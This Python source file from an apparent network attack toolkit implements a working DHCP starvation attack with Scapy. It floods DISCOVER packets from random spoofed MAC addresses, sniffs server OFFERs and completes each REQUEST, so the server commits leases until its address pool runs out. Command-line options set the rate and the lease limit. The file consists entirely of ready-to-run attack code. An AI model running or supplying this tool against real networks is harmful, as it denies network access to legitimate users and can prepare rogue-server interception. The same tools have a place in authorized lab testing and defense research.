# attacks/starvation.py
import threading
import time
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, sniff
from attacks.base import BaseAttack
from common.packet_utils import random_mac, random_xid, mac_str_to_bytes


class StarvationAttack(BaseAttack):
    """
    DHCP Starvation with full DORA completion.
    Not just DISCOVER flooding — sniffs OFFERs and completes
    REQUEST so the server actually commits (ACKs) each lease.
    """

    def __init__(self, iface, rate=0.1, max_leases=None, logger=None):
        super().__init__(iface, logger)
        self.rate = rate
        self.max_leases = max_leases
        self.stats = {
            "discover_sent": 0,
            "offer_received": 0,
            "request_sent": 0,
            "ack_received": 0,
            "nak_received": 0,
        }
        self._pending = {}  # key: xid, value: dict עם mac/ip

    def run(self):
        self.logger.info(
            "Starting DHCP Starvation (full DORA) on %s (rate=%s, max_leases=%s)",
            self.iface, self.rate, self.max_leases,
        )

        sniff_thread = threading.Thread(target=self._sniff_offers, daemon=True)
        sniff_thread.start()

        try:
            while not self.stopped:
                if self.max_leases is not None and self.stats["ack_received"] >= self.max_leases:
                    self.logger.info("Reached max_leases=%d, stopping.", self.max_leases)
                    self.stop()
                    break
                self._send_discover()
                self.stats["discover_sent"] += 1
                time.sleep(self.rate)
        finally:
            self.print_summary()

    def _send_discover(self):
        mac = random_mac()
        xid = random_xid()
        pkt = (
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac_str_to_bytes(mac), xid=xid, flags=0x8000) /
            DHCP(options=[("message-type", "discover"), "end"])
        )
        sendp(pkt, iface=self.iface, verbose=0)
        self.logger.debug("DISCOVER sent — MAC=%s xid=%s", mac, hex(xid))

    def _send_request(self, client_mac, offered_ip, server_ip, xid):
        pkt = (
            Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac_str_to_bytes(client_mac), xid=xid, flags=0x8000) /
            DHCP(options=[
                ("message-type", "request"),
                ("requested_addr", offered_ip),  # Option 50
                ("server_id", server_ip),        # Option 54
                "end",
            ])
        )
        sendp(pkt, iface=self.iface, verbose=0)
        self.stats["request_sent"] += 1
        self.logger.info("REQUEST sent — claiming %s for MAC=%s", offered_ip, client_mac)

    def _process_packet(self, packet):
        if not (packet.haslayer(DHCP) and packet.haslayer(BOOTP)):
            return

        msg_type = self._extract_msg_type(packet)
        xid = packet[BOOTP].xid

        if msg_type == 2:  # OFFER
            self.stats["offer_received"] += 1
            offered_ip = packet[BOOTP].yiaddr
            server_ip = packet[IP].src
            mac_bytes = packet[BOOTP].chaddr[:6]
            client_mac = ":".join(f"{b:02x}" for b in mac_bytes)

            self._pending[xid] = {"mac": client_mac, "ip": offered_ip}
            self.logger.debug(
                "Captured OFFER — xid=%s ip=%s server=%s mac=%s",
                hex(xid), offered_ip, server_ip, client_mac,
            )
            self._send_request(client_mac, offered_ip, server_ip, xid)

        elif msg_type == 5:  # ACK
            self.stats["ack_received"] += 1
            if xid in self._pending:
                info = self._pending.pop(xid)
                self.logger.info("Lease CONFIRMED — ip=%s mac=%s", info["ip"], info["mac"])

        elif msg_type == 6:  # NAK
            self.stats["nak_received"] += 1
            server_ip = packet[IP].src
            nak_reason = "No reason provided by server"
            for opt in packet[DHCP].options:
                if isinstance(opt, tuple) and opt[0] == "error_message":
                    nak_reason = opt[1].decode("utf-8", errors="ignore")

            info = self._pending.pop(xid, None)
            self.logger.warning("DHCPNAK from %s — xid=%s reason=%s", server_ip, hex(xid), nak_reason)
            if info:
                self.logger.warning("  Failed: MAC=%s Requested_IP=%s", info["mac"], info["ip"])

    def _extract_msg_type(self, packet):
        for opt in packet[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == "message-type":
                return opt[1]
        return None

    def _sniff_offers(self):
        sniff(
            iface=self.iface,
            filter="udp and (port 67 or port 68)",
            prn=self._process_packet,
            store=0,
            stop_filter=lambda pkt: self.stopped,
        )

    # --- CLI integration ---

    @classmethod
    def configure_parser(cls, parser):
        parser.add_argument("--rate", type=float, default=0.1,
                             help="Seconds between DISCOVER packets (default: 0.1)")
        parser.add_argument("--max-leases", type=int, default=None,
                             help="Stop after this many confirmed ACKs (default: unlimited)")

    @classmethod
    def from_args(cls, args):
        return cls(iface=args.iface, rate=args.rate, max_leases=args.max_leases)
